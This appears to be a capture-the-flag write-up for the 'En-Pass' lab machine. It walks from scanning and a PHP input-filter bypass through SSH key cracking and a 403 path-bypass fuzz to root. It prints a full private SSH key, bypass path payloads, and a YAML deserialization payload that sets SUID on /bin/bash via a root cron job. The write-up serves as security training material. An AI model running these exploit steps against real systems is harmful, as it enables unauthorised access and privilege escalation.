@@ -1,0 +1,451 @@
+En-Pass
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.57.200
+Host is up, received conn-refused (0.18s latency).
+Scanned at 2021-02-11 01:24:28 EST for 13s
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCicax/djwvuiP5H2ET5UJCYL3Kp7ukHPJ0YWsSBUc6o8O/wwzOkz82yJRrZAff40NmLEpbvf0Sxw2JhrtoxDmdj+FSHpV/xDUG/nRE0FU10wDB75fYP4VFKR8QbzwDu6fxkgkZ3SAWZ9R1MgjN3B49hywgwqMRNtw+z2r2rXeF56y1FFKotBtK1wA223dJ8BLE+lRkAZd4nOr5HFMwrO+kWgYzfYJgSQ+5LEH4E/X7vWGqjdBIHSoYOUvzGJJmCum2/MOQPoDw5B85Naw/aMQqsv7WM1mnTA34Z2eTO23HCKku5+Snf5amqVwHv8AfOFub0SS7AVfbIyP9fwv1psbP
+|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBENyLKEyFWN1XPyR2L1nyEK5QiqJAZTV2ntHTCZqMtXKkjsDM5H7KPJ5EcYg5Rp1zPzaDZxBmPP0pDF1Rhko7sw=
+|   256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmb0JdTeq8kjq+30Ztv/xe3wY49Jhc60LHfPd5yGiRx
+8001/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: En-Pass
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ON THE WEBPAGE THERE ARE DIFFERENT PICTURES CONTAINING SOME TEXT IN IT:
+
+FIRST PICTURE(rot23):
+Best of Luck!!
+
+SECOND PICTURE(base64):
+Sad
+d
+
+BUT NOTHING INTERESTING
+
+
+GOBUSTER RESULTS:
+
+/index.html (Status: 200)
+/server-status (Status: 403)
+/web (Status: 301)
+/zip (Status: 301)
+/reg.php (Status: 200)
+
+
+LETS CHECK THEM ALL!!
+
+/ZIP CONTAINS LOTS OF ZIP FILES (100 zip files!!)
+NOT AUTHORIZED TO /WEB
+
+IN THE /REG.PHP, IT ASK FOR A INPUT TO VALIDATE ,ON CHECKING SOURCE CODE:
+
+f($_SERVER["REQUEST_METHOD"] == "POST"){
+   $title = $_POST["title"];
+   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
+          
+          $val = explode(",",$title);
+
+          $sum = 0;
+          
+          for($i = 0 ; $i < 9; $i++){
+
+                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
+
+                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
+            
+                        $sum = $sum+ (bool)$val[$i]."<br>"; 
+                }
+          
+          
+          }
+
+          if ( ($sum) == 9 ){      
+
+              echo $result;//do not worry you'll get what you need.
+              echo " Congo You Got It !! Nice ";
+            
+            }
+            
+                    else{
+
+                      echo "  Try Try!!";
+
+                    }
+          }
+        
+          else{
+
+            echo "  Try Again!! ";
+
+      
+          }     
+ 
+  }
+
+as we can see a funtion called explode() wich actually
+explode() is a built in function in PHP used to split a string in different strings. The explode() function splits a string based on a string delimeter, i.e. 
+it splits the string wherever the delimeter character occurs. This functions returns an array containing the strings formed by splitting the original string.
+
+for example:
+
+kali@kali:~/enpass$ cat exp.php 
+<?php
+// original string 
+	$OriginalString = "Hello, How can we help you?"; 
+	
+	// Without optional parameter NoOfElements 
+	print_r(explode(",",$OriginalString)); 
+
+?>
+kali@kali:~/enpass$ php exp.php 
+Array
+(
+    [0] => Hello
+    [1] =>  How can we help you?
+)
+kali@kali:~/enpass$ 
+
+as  we can see that it divide the string taking delimeter as ","
+
+if (!preg_match('/[a-zA-Z0-9]/i' , $title ))
+this line means that alphabets and numerics are not allowed:
+
+USING ALL THESE CONCEPT I MAKE SOME CHANGES IN THE SCRIPT:
+
+<?php
+       //$string = "!@#$%^&*()";
+       $OriginalString = "#$, *() ,$%^ ,(*& ,!@#$ ,#@(*, %)( ,^&# ,!(*"; 
+        if (!preg_match('/[a-zA-Z0-9]/i' , $OriginalString )){
+        print_r(explode(",",$OriginalString)); 
+$val = explode(",",$OriginalString);
+
+          $sum = 0;
+
+          for($i = 0 ; $i < 9; $i++){
+
+                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
+
+                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
+
+                        $sum = $sum+ (bool)$val[$i]."<br>"; 
+                }  
+         }
+                print_r($sum);
+          if ( ($sum) == 9 ){
+
+
+             // echo $result;                                 //do not worry you'll get what you need.
+              echo " Congo You Got It !! Nice ";
+
+            }
+ }
+
+   else {
+          echo "Wrong";
+     }
+?>
+
+
+/// and we got the password:
+
+// Nice. Password : cimihan_are_you_here? 
+
+AND WE GOT THE PASSWORD
+and extracting one of the zip file got a word "sadman" maybe the username?
+NO IT'S NOT
+
+NOW I GOBUSTER THE /WEB DIRECTORY:
+
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.txt (Status: 403)
+/resources (Status: 301)
+============================
+LETS GOBUSTER THE /WEB/RESOURCES DIRECTORY:
+
+/infoseek (Status: 301)
+
+LETS GOBUSTER /WEB/RESOURCES/INFOSEEK:
+
+/configure (Status: 301)
+
+ONE MORE TIME(/WEB/RESOURCES/INFOSEEL/CONFIGURE):
+
+/key (Status: 200)
+
+SO OUR PATH IS :/web/resources/infoseek/configure/key
+
+THIS PATH GIVES US SSH PRIVATE KEY:
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,3A3DBCAED659E70F7293FA98DB8C1802
+
+V0Z7T9g2JZvMMhiZ6JzYWaWo8hubQhVIu3AcrxJZqFD0o2FW1K0bHGLbK8P+SaAc
+9plhOtJX6ZUjtq92E/sinTG0wwc94VmwiA5lvGmjUtBjah4epDJs8Vt/tIpSTg8k
+28ef1Q8+5+Kl4alJZWNF0RVpykVEXKqYw3kJBqQDTa4aH75MczJGfk4TY5kdZFO3
+tPVajm46V2C/9OrjOpEVg2jIom+e4kJAaJdB7Jr7br3xoaYhe5YEUiSGM8YD7SUZ
+azrAFkIoZ72iwdeVGR7CWgdwmDWw/nFvg6Ug/fsAGobDCf2CtwLEUtLL/XMpLvEb
+AS0Wic1zPjCCGaVSyijImrh3beYgWbZzz7h5gmqfoycVKS4S+15tFZBZRA0wH05m
+XfDw6It7ZZtP73i8XoOAg1gAbv6o/vR3GkF798bc0fV4bGJrpQ9MIEpOphR1SNuI
+x0gjtCfIyYjwJmwlWeNmELyDAO3oIxYZBSydHko0EUBnbeOw+Jj3xvEdNO3PhZ7G
+3UPIoZMH4KAdcXy15tL0MYGmXyOx+oHuDEPNHxkR3+lJ1C+BXJwtrSXU+qz9u/Sz
+qavHdwzxc8+HiiWcGxN3LEdgfsKg/TKXA5X/TE7DnjVmhsL4IBCOIyPxF8ClXok7
+YMwNymz269J85Y73gemMfhwvGC18dNs0xfYEMUtDWbrwJDsTezdBmssMvOHSjpr5
+w+Z+sJvNabMIBVaQs+jqJoqm8EARNzA40CBQUJJdmqBfPV/xSmHzNOLdTspOShQN
+5iwP3adKdq+/TCp2l8SaXQedMIf6DCPmcuUVrYK4pjAr7NzFVNUgqbYLT1J0thGr
+gQBk+0RlQadN7m7BW835YeyvN0GKM35f7tUylJHcfTdjE832zB24iElDW483FvJy
+RhM+bOBts0z+zVUx0Ua+OEM1sxwAAlruur4+ucCPFV1XrWYWfLo3VXvTbhPiZcXF
+fmOJKaFxBFjbARQMR0IL5CH8tPz2Kbeaepp2sUZcgDZSHWAbvg0j8QVkisJJ/H7G
+Vg6MdIRf+Ka9fPINxyrWnxDoIVqP5/HyuPjrmRN9wMA8lWub8okH9nlJoss3n8j5
+xom80wK197o29NN6BWEUuagXSHdnU2o+9L991kScaC9XXOuRgqFrDRFBUUn1VOWJ
+3p+lTLNscC+eMP0Be3U6R85b/o3grdb610A1V88pnDWGYa/oVgXelUh1SsHA0tuI
+om679j9qdIP7O8m3PK0Wg/cSkjdj0vRxT539tAY1+ci99FXnO1Touo7mlaA4eRTK
+LQLmzFcucQODcm3FEy18doT2llDTyloD2PmX+ipzB7mbdqw7pUXPyFTnGZoKrnhM
+27L629aKxoM19Mz0xP8BoQMcCOCYklIw1vkaiPgXAYkNXXtBzwWn1SFcU57buaED
+CJCnh3g19NZ/VjJ1zERJLjK1U1l/RtlejISAB35AYFUnKDG3iYXLRP3iT/R22BMd
+z4uSYN10O1nr4EppAOMtdSdd9PJuwxKN/3nJvymMf3O/MmC/8DJOIyadZzEw7EbP
+iU5caghFrCuuhCagiwYr+qeKM3BwMUBPeUXVWTCVmFkA7jR86XTMfjkD1vgDFj/8
+-----END RSA PRIVATE KEY-----
+
+
+
+hmm, password protected key:
+kali@kali:~/enpass$ ssh -i key sadman@10.10.103.88 
+Enter passphrase for key 'key': 
+sadman@10.10.103.88: Permission denied (publickey).
+
+use ssh2john, for verification i add that password which we find earlier in the rockyou.txt and then use john:
+
+kali@kali:~/enpass$ sudo john --wordlist=../rockyou.txt key_hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+cimihan_are_you_here? (enpass/key)
+1g 0:00:00:16 DONE (2021-02-11 03:23) 0.05973g/s 856732p/s 856732c/s 856732C/sa6_123..cimihan_are_you_here?
+Session completed
+
+yes this is the password!!
+but we don't know the username
+
+I LEARN ABOUT OPENSSL WHICH CAN CHANGE THE RSA-ENCRYPTED KEY INTO RSA PRIVATE KEY:
+
+ali@kali:~/enpass$ openssl rsa -in key -out id_rsa
+Enter pass phrase for key:
+writing RSA key
+kali@kali:~/enpass$ ls
+10.10.37.104:8001  3.jpg  binary.dat  code_exp.php  dict.txt  hash  id_rsa  index.html  index.jpeg  key  key_hash.txt  pass  patan2.jpg  patan.jpg
+kali@kali:~/enpass$ cat id_rsa 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAxxRs4bP1v4b2ELl1IBy6tdeVjbbc4VpdV85ZCDLJLPjO6+1P
+aLnO4tgcpz9YQiSpwXmrcfzODwdzxJ9oBvmUnd/98lDtsXpdIaRytcvbjXfJUQWP
+MfXJ2ofsuGE2CO9JdzbOw/t9NAQQvLlK+1m16jTU52DMwFDIDWmanOy+bl7WBwGx
+CHOzuiGbAXtk67BICfR17VYpqbakEKZuVmzljmoHnFHZl4rIlhbH8b9upBEJwQdt
+wjLuUEvmAW1ihHnIL/k+OF72nyieJPNCoKKoyQNAV57CbJNYx7VlmqqzUN1dyAr6
+ILkCjE17t8i+6b0LmTmGTG4OKR53krnqwB5N8QIDAQABAoIBAQDCiEr9IgT5ar/4
+B8FT577rAga5u/6KluqvaovFXxsGPvqzv+jgxPBM6jDVnSh5OapHzMSjVg1k0jtl
+3v6gEjIPM1nK9xnNW2y1+yO8Ub/wtSSbb3tFro/YYwoGAbfzcx+uxne1OoJV2cMh
+J08F3dvNSGLi1cw+ALH7qT3UKeLLpVaKSVX2ijGIgIb+V4oArHiVstsydBCeq9G4
+/YujvavBaCgmu82dNtPzP9ai4yfWq1mYXTncdZfH3yKNY2/qlHthAj1fYbVwtOXr
+4/baR2okd0ZKnELKUvEirXxMqmq/PlS3M6cTZnNP4fUxibXgannIaWgIaQ8myBil
+NWAdI+ohAoGBAOwbnSgPZ8NqeZViB7FJd2ms1UgcnbYtdmEm1aJe1j3QTqYMAYOQ
+wm3OnnPQwlDIKl8HaGQ5b2S3LFNSGHuShcUY5k7BqXUn32lPmLEdNKdgyYfyJ0wx
+ltvyEZR30C4wmdgpDWc56AL+QtW7OSU1R+MhF9/d+D2iikQzYDMdCLpzAoGBANfa
+MB5qeqc53qVV51880dLwLyInQumLbHz4RgRXv0WZgZU/c9k0Vh4Kc/jIdf186Fxb
+9NzZ9pe2Ii+HXVsKXkoxFU7zFTwPRxG3WVeayDQUdtK1V68g5k/IweoKO+75JdxU
+J+PpKSwcE2P/cYqiQnYCXkhOmo+z7fiKPlpnvskLAoGBAM48+LPrcPnTYczIymtj
+/vjBzbOlu2VMpOEL6QRhzsZD1M9aIWBo7Ey6dNI5geLKVaiYcelJ+jGBhyhox5X5
+UPvvWg1lQL5jS9VTf88F8d5avu8O6KC3mE0bT5veZGxUa63Tfi+y9yTWME89sRb9
+SYPufkpAO/yqpBgawGclb2BdAoGAcTKSY5ERq5sUoP5Q7UgW/ZlKDo4qcBHXHh6R
+kXt26ogbRerV1UW2F+EBeqmd/wa/UJhE7IE96cfxW52QnsrsMdpVw2aFb07PxYGy
+z9dzQKSuv8esKUKGpbaxwwwE7EkqysYzeTlwhxpeLOXsZHi9g+ewDBl0wwHoPZw6
+IO0hR4sCgYBIKx60fT8jUpXm5GhZjWyf3atT7fY/AvWUX2UBPACsRR0H5p+p56bO
+dc8iYpxopgnimI61wpcszH/rFxBo1tOKIzxppgV/0XlGD7r84wo1pTs3tOZUwUt+
+fAqK6TY8jOOWhiP2KQJ/pCB2Vu+/Fzi3wxSxy1r3rgIrGILV6vARqQ==
+-----END RSA PRIVATE KEY-----
+
+NOW TRY SSH
+
+I DONT HAVE THE USERNAME SO I LOOK THE HINT AND THEN CHECK THE 403.PHP PAGE, BUT CAN'T FIND ANYTHING
+SO I DECIDED TO CHECK SOME TOOLS TO FUZZ THE 403 PAGE AND GOT A 403FUZZER TOOL FROM GITHUB
+
+
+use this script to fuzz endpoints that return a 401/403
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     Specify the target URL
+  -c COOKIES, --cookies COOKIES
+                        Specify cookies to use in requests. (e.g., --cookies "cookie1=blah; cookie2=blah")
+  -p PROXY, --proxy PROXY
+                        Specify a proxy to use for requests (e.g., http://localhost:8080)
+  -hc HC                Hide response code from output, single or comma separated
+  -hl HL                Hide response length from output, single or comma separated
+
+kali@kali:/opt/403fuzzer$ sudo python3.9 403fuzzer.py -u http://10.10.68.146:8001/403.php -hc 404,403
+Response Code: 200	Length: 2563	Path: /
+Response Code: 200	Length: 2563	Path: /
+Response Code: 400	Length: 306	Path: /%2e%2e/403.php
+Response Code: 400	Length: 306	Path: /../403.php
+Response Code: 200	Length: 2563	Path: /
+Response Code: 400	Length: 306	Path: /%2e%2e/403.php
+Response Code: 400	Length: 306	Path: /../../../403.php
+Response Code: 400	Length: 306	Path: /../..//../403.php
+Response Code: 400	Length: 306	Path: /../../403.php
+Response Code: 400	Length: 306	Path: /../..;/403.php
+Response Code: 400	Length: 306	Path: /.././../403.php
+Response Code: 400	Length: 306	Path: /../.;/../403.php
+Response Code: 400	Length: 306	Path: /..//../../403.php
+Response Code: 400	Length: 306	Path: /..//../403.php
+Response Code: 400	Length: 306	Path: /../403.php
+Response Code: 400	Length: 306	Path: /../;/../403.php
+Response Code: 400	Length: 306	Path: /../;/403.php
+Response Code: 400	Length: 306	Path: //../../403.php
+Response Code: 400	Length: 306	Path: ///../403.php
+Response Code: 200	Length: 2563	Path: /
+Response Code: 200	Length: 2563	Path: /403.php%3b/%2e.
+Response Code: 200	Length: 2563	Path: /403.php%3b/..
+Response Code: 200	Length: 2563	Path: /403.php/%2e%2e
+Response Code: 200	Length: 2563	Path: /403.php/%2e%2e/
+Response Code: 200	Length: 2563	Path: /403.php/..
+Response Code: 200	Length: 2563	Path: /403.php/../
+Response Code: 400	Length: 306	Path: /403.php/../../
+Response Code: 400	Length: 306	Path: /403.php/../../../
+Response Code: 200	Length: 2563	Path: /403.php/../../..//
+Response Code: 200	Length: 2563	Path: /403.php/../..//
+Response Code: 400	Length: 306	Path: /403.php/../..//../
+Response Code: 400	Length: 306	Path: /403.php/.././../
+Response Code: 200	Length: 2563	Path: /403.php/../.;/../
+Response Code: 200	Length: 2563	Path: /403.php/..//
+Response Code: 200	Length: 2563	Path: /403.php/..//../
+Response Code: 400	Length: 306	Path: /403.php/..//../../
+Response Code: 200	Length: 2563	Path: /403.php/../;/../
+Response Code: 200	Length: 917	Path: /403.php/..;/
+Response Code: 200	Length: 2563	Path: /403.php//../../
+Response Code: 200	Length: 2563	Path: /403.php;/%2e%2e
+Response Code: 200	Length: 2563	Path: /403.php;/%2e%2e/
+Response Code: 200	Length: 2563	Path: /403.php;/%2e.
+Response Code: 200	Length: 2563	Path: /403.php;/.%2e
+Response Code: 200	Length: 2563	Path: /403.php;/..
+Response Code: 200	Length: 2563	Path: /403.php;/../
+Response Code: 400	Length: 306	Path: /403.php;/../../
+Response Code: 200	Length: 2563	Path: /403.php;/../..//
+Response Code: 400	Length: 306	Path: /403.php;/.././../
+Response Code: 200	Length: 2563	Path: /403.php;/../.;/../
+Response Code: 200	Length: 2563	Path: /403.php;/..//
+Response Code: 200	Length: 2563	Path: /403.php;/..//%2e%2e/
+Response Code: 200	Length: 2563	Path: /403.php;/..//../
+Response Code: 200	Length: 2563	Path: /403.php;/..///
+Response Code: 200	Length: 2563	Path: /403.php;/../;/../
+Response Code: 200	Length: 2563	Path: /403.php;//../../
+Response Code: 400	Length: 306	Path: /;/../../403.php
+Response Code: 400	Length: 306	Path: /;/.././../403.php
+Response Code: 200	Length: 2563	Path: /
+Response Code: 200	Length: 2563	Path: /
+Response Code: 200	Length: 2563	Path: /
+Response code: 200   Response length: 0   Sent OPTIONS method. 
+
+Response length was 0 so probably NOT worth checking out....
+
+Response Headers: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: close
+Accept-Language: en-US,en;q=0.5
+DNT: 1
+Upgrade-Insecure-Requests: 1
+Content-Length: 0
+
+USING THE PAYLOAD:
+http://10.10.68.146:8001/403.php/..;/
+
+<h3>Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.</h3>
+
+GOT THE USERNAME!!!
+NOW SSH USING IT
+
+
+$ bash -i
+imsau@enpass:~$ id
+uid=1002(imsau) gid=1002(imsau) groups=1002(imsau)
+imsau@enpass:~$ 
+
+IM IN
+
+USING LINPEAS FOR PRIVESC GOT SOME VECTORS:
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/home/imsau/bin:/home/imsau/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+New path exported: /home/imsau/bin:/home/imsau/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+I USE PSPY FOR CHECKING ANY CRONJOBS RUNNING IN THE MACHINE:
+
+2021/02/13 13:57:49 CMD: UID=0    PID=1      | /sbin/init 
+2021/02/13 13:58:01 CMD: UID=0    PID=1465   | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
+2021/02/13 13:58:01 CMD: UID=0    PID=1464   | sudo chown root:root /tmp/file.yml 
+2021/02/13 13:58:01 CMD: UID=0    PID=1463   | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
+2021/02/13 13:58:01 CMD: UID=0    PID=1462   | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
+
+THIS CRONJOB IS RUNNING A FILE AS ROOT THEN DELETES IT, CAN THIS FILE HAS WRITABLE PERMISSION?
+ACTUALLY THIS FILE IS NOT PRESENT AT ALL SO WE CAN MAKE OUR OWN FILE WITH OUR MALICIOUS CODE IN IT AND GOT A ROOT SHELL
+
+FIRST CHECK HOW THIS ALL THINGS WORKS ANF WHICH FILE HAS A CONTROL OVER THIS PROCESS
+
+-r-xr-xr-x 1 root root  250 Jan 31 19:40 file.py
+imsau@enpass:/opt/scripts$ cat file.py 
+#!/usr/bin/python
+import yaml
+
+
+class Execute():
+	def __init__(self,file_name ="/tmp/file.yml"):
+		self.file_name = file_name
+		self.read_file = open(file_name ,"r")
+
+	def run(self):
+		return self.read_file.read()
+
+data  = yaml.load(Execute().run())
+imsau@enpass:/opt/scripts$ 
+
+A FILE NAME /TMP/FILE.YML IS MADE AND THEN EXECUTES AS ROOT SO MAKE A FILE IN /TMP DIRECTORY AND ADD THIS PAYLOAD IN IT:
+!!python/object/apply:os.system ["chmod 4777 /bin/bash"]
+
+THEN WAIT FOR A SHELL TO SPAWN
+ACTUALLY IT DELETES THAT FILE IN EVERY SECOND SO WE HAVE TO MAKE A INFINITE LOOP WHICH CONTINUOSLY MAKES THAT FILE AND ADDING OUR PAYLOAD INTO IT
+
+imsau@enpass:~$ cat shell.yml 
+!!python/object/apply:os.system [chmod 4777 /bin/bash]
+imsau@enpass:~$ while true; do cp shell.yml /tmp/file.yml done; &
+
+
+in a minute or so it sets a suid bit to the /bin/bash 
+
+imsau@enpass:/tmp$ ls -lha /bin/bash 
+-rwsrwxrwx 1 root root 1014K Jul 12  2019 /bin/bash
+
+imsau@enpass:/tmp$ /bin/bash -p
+bash-4.3# id
+uid=1002(imsau) gid=1002(imsau) euid=0(root) groups=1002(imsau)
+bash-4.3# 
+
+IM ROOT NOW 
+GOT BOTH FLAGS
